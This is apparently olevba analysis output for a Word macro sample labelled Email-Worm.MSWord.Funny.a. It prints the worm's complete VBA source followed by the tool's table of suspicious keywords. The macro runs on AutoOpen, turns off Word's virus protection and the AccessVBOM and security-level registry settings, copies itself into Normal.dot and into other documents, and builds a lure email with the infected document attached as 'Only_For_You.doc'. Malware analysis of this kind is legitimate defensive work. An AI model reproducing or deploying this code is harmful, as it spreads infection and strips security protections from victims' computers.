olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Email-Worm.MSWord.Funny.a-9c094c500c34e3c38ab2ea0936ccb855c94f5424
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Email-Worm.MSWord.Funny.a-9c094c500c34e3c38ab2ea0936ccb855c94f5424 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, nSize As Long) As Long


Sub AutoOpen()
'Tebonin
'(c) by Necronomikon/DoomRiderz
Call FuckProtection
Call InfectWord

Call CreateEML

End Sub

Sub InfectWord()
On Error Resume Next
Set nor = NormalTemplate.VBProject.VBComponents
Set doc = ActiveDocument.VBProject.VBComponents
srcvir = "C:\tebonin.drv"
If nor.Item("tebonin").Name <> "tebonin" Then
    doc("tebonin").Export srcvir
    nor.Import srcvir
    End If
If doc.Item("tebonin").Name <> "tebonin" Then
    nor("tebonin").Export srcvir
    doc.Import srcvir
    ActiveDocument.Save
    End If
Kill (srcvir)
End Sub

Sub FuckProtection()
With Options
    .ConfirmConversions = 2 Xor 2
    .VirusProtection = 3 Xor 3
    .SaveNormalPrompt = 4 Xor 4
End With
Select Case Application.Version
Case "10.0"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") = 1&
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "AccessVBOM") = 1&
Case "9.0"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
End Select
WordBasic.DisableAutoMacros 0
End Sub

Sub CreateEML()

Dim strUserName As String
strUserName = String(100, Chr$(0))
GetUserName strUserName, 100
strUserName = Left$(strUserName, InStr(strUserName, Chr$(0)) - 1)


bound = ""
For i = 1 To 17
Randomize (Timer)
bound = bound + Chr(Int(Rnd(1) * 8) + 48)
Next

eml1 = "To: """ & strUserName & "@microsoft.com""" & vbCrLf & _
        "Subject: Hello You..." & vbCrLf & _
        "Date: " & Hour(Now) & ":" & Minute(Now) & ":" & Second(Now) & " +0200" & vbCrLf & _
        "MIME-Version: 1.0" & vbCrLf & _
        "Content-Type: multipart/mixed;" & vbCrLf & _
        vbTab & "boundary = ""----=_NextPart_" & bound & """" & vbCrLf & _
        "X-Priority: 3" & vbCrLf & _
        "X -MSMail - Priority: Normal" & vbCrLf & _
        "X-Unsent: 1" & vbCrLf & _
        "X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000" & vbCrLf & vbCrLf & _
        "This is a multi-part message in MIME format." & vbCrLf & vbCrLf
        
eml2 = "------=_NextPart_" & bound & vbCrLf & _
        "Content-Type: text/plain;" & vbCrLf & _
        vbTab & "Charset=""iso-8859-1""" & vbCrLf & _
        "Content-Transfer-Encoding: 7bit" & vbCrLf & vbCrLf & _
        "Hello my friend, this is a funny file for you" & vbCrLf & vbCrLf & _
        vbTab & vbTab & "Best Regards" & vbCrLf & vbCrLf & vbCrLf

eml3 = "------=_NextPart_" & bound & vbCrLf & _
        "Content-Type: application/x-msdownload;" & vbCrLf & _
        vbTab & "name = ""Only_For_You.doc""" & vbCrLf & _
        "Content -Transfer - Encoding: base64" & vbCrLf & _
        "Content-Disposition: attachment;" & vbCrLf & _
        vbTab & "fileName = ""Only_For_You.doc""" & vbCrLf & vbCrLf

eml4 = EncodeBase64(ActiveDocument.FullName)

eml5 = vbCrLf & "------=_NextPart_" & bound

Open "hello.eml" For Output As #1
Print #1, eml1 & eml2 & eml3 & eml4 & eml5
Close #1

End Sub

Private Function EncodeBase64(ByVal vsFullPathname As String) As String
On Error Resume Next
    Dim b           As Integer
    Dim Base64Tab   As Variant
    Dim bin(3)      As Byte
    Dim s           As String
    Dim l           As Long
    Dim i           As Long
    Dim FileIn      As Long
    Dim sResult     As String
    Dim n           As Long
    
    Base64Tab = Array("A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "+", "/")
    
    Erase bin
    l = 0: i = 0: FileIn = 0: b = 0:
    s = ""
    
    FileIn = FreeFile
    
    Open vsFullPathname For Binary As FileIn
    
    sResult = s & vbCrLf
    s = ""
    
    l = LOF(FileIn) - (LOF(FileIn) Mod 3)
    
    For i = 1 To l Step 3

        Get FileIn, , bin(0)
        Get FileIn, , bin(1)
        Get FileIn, , bin(2)
        
        If Len(s) > 72 Then

            s = s & vbCrLf
            sResult = sResult & s
            s = ""

        End If

        b = (bin(n) \ 4) And &H3F
        s = s & Base64Tab(b)
        
        b = ((bin(n) And &H3) * 16) Or ((bin(1) \ 16) And &HF)
        s = s & Base64Tab(b)
        
        b = ((bin(n + 1) And &HF) * 4) Or ((bin(2) \ 64) And &H3)
        s = s & Base64Tab(b)
        
        b = bin(n + 2) And &H3F
        s = s & Base64Tab(b)
        
    Next i

    If Not (LOF(FileIn) Mod 3 = 0) Then

        For i = 1 To (LOF(FileIn) Mod 3)
            Get FileIn, , bin(i - 1)
        Next i
    
        If (LOF(FileIn) Mod 3) = 2 Then
            b = (bin(0) \ 4) And &H3F
            s = s & Base64Tab(b)
            
            b = ((bin(0) And &H3) * 16) Or ((bin(1) \ 16) And &HF)
            s = s & Base64Tab(b)
            
            b = ((bin(1) And &HF) * 4) Or ((bin(2) \ 64) And &H3)
            s = s & Base64Tab(b)
            
            s = s & "="

        Else
            b = (bin(0) \ 4) And &H3F
            s = s & Base64Tab(b)
            
            b = ((bin(0) And &H3) * 16) Or ((bin(1) \ 16) And &HF)
            s = s & Base64Tab(b)
            
            s = s & "=="
        End If
    End If

    If s <> "" Then
        s = s & vbCrLf
        sResult = sResult & s
    End If
    
    s = ""
    
    Close FileIn
    EncodeBase64 = sResult
    
End Function



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+
